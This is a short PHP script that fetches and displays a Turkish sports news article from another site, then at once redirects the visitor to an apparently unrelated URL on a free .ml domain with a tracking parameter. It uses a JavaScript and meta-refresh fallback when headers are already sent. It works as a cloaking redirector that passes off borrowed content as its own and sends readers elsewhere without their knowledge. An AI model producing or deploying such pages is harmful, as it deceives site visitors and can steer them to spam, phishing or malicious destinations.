<?php
$homepage = file_get_contents('https://kralspor.ensonhaber.com/falcao-antrenmanlara-basladi-2019-10-19.html');
echo $homepage;

function Redirect($url){ 

    if (!headers_sent()){ 

    header('Location: '.$url); exit; 

    }else{ 

    echo '<script type="text/javascript">'; 

    echo 'window.location.href="'.$url.'";'; 

    echo '</script>'; 

    echo '<noscript>'; 

    echo '<meta http-equiv="refresh" content="0;url='.$url.'" />'; 

    echo '</noscript>'; exit; 

    } 

    }

$url="  https://hizlikisalt.ml/t.php?s=d192";

  Redirect("$url");

?>
